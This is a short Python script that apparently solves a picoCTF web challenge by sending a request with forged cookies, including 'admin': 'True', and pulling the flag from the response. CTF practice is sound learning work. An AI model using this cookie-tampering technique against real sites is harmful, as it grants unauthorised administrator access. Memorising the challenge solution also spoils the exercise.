#!/usr/bin/env python3

import requests
from colorama import Fore
import re

url = "https://jupiter.challenges.picoctf.org/problem/13594/flag"

cookies = {
	"admin": "True",
	"username": "joe",
	"password": "password"
}

res = requests.get(url, cookies=cookies)

if "picoCTF{" in res.text:
	flag = re.findall("picoCTF{.*}", res.text)
	flag = flag[0]
	print(flag)
else:
	print(Fore.RED + "[-] The Flag could not be found")